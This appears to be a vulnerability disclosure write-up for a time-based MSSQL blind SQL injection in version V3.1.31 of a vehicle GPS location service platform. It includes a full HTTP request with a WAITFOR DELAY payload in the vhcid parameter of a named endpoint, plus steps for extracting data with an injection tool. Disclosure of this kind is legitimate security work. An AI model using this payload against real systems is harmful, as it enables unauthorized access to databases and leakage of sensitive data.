Car_GPS There is an SQL injection vulnerability in the location information service platform.

Recurrence of vulnerabilities

The location information service platform V3.1.31 has an SQL injection vulnerability, with an injection type of MSSQL blind injection. Attackers can use this vulnerability to obtain sensitive data and cause important data leakage.

Affected version: V3.1.31 case reproduction as shown in the figure, this is a testing site.

![image](https://github.com/hou456/Car_GPS/assets/66346276/ef97bf66-2670-4d99-ba04-a11fa3b7eb17)

Burp suite sends the following data packet and injects the parameter vhcid, with a test delay of 6 seconds

POST /mygpsonline/json/reportsAction_getVehicleData.action HTTP/1.1
Host: xxx:89
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36
Origin: http://www.xxxx.com:89
Content-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Type: application/json
Content-Length: 101

key=820abc957ae7128c8c9613df9a9dca57&vhcid=1;if (1=1)  WAITFOR DELAY '0:0:6'--&shareTime=1&playTime=1


![image](https://github.com/hou456/Car_GPS/assets/66346276/c7dcb69b-bced-4f79-9493-f0857d0e30da)



Burp suite sends an if (1=2) packet and injects the parameter vhcid, with a test delay of 6 seconds, resulting in a direct error return.
![image](https://github.com/hou456/Car_GPS/assets/66346276/85ca55ad-2775-4069-852a-8f43095eb2a9)

Burp suite sends an if (1=1) packet and injects the parameter vhcid, with a test delay of 10 seconds, and returns after 10 seconds.
![image](https://github.com/hou456/Car_GPS/assets/66346276/f8c2781d-6090-4207-b557-bfd6164316c3)

Burp suite sends an if (1=2) packet and injects the parameter vhcid, with a test delay of 10 seconds and no delay of 10 seconds.
![image](https://github.com/hou456/Car_GPS/assets/66346276/a698a510-95c3-4133-83dd-0351e9845c9e)

Obtaining data using super SQL injection tools
![image](https://github.com/hou456/Car_GPS/assets/66346276/2d397de1-fde8-4e2e-b2e1-93d7c243df20)

![image](https://github.com/hou456/Car_GPS/assets/66346276/d06f8b9c-f378-4083-8886-255ab0740b9a)


